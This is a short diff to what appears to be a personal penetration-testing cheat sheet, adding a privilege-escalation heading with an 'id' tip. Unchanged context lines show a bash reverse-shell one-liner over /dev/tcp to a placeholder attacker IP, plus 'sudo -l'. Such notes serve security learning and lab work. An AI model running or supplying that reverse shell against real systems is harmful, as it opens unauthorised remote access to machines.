@@ -91,3 +91,7 @@ Helpful resources
 ### bash
  - `bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"`, reverse shell.
  - `sudo -l` check sudo permissions.
+ - 
+
+# Privilige escalation
+ - `id` see what groups we are a part of, google to see if these groups have any extra permissions.
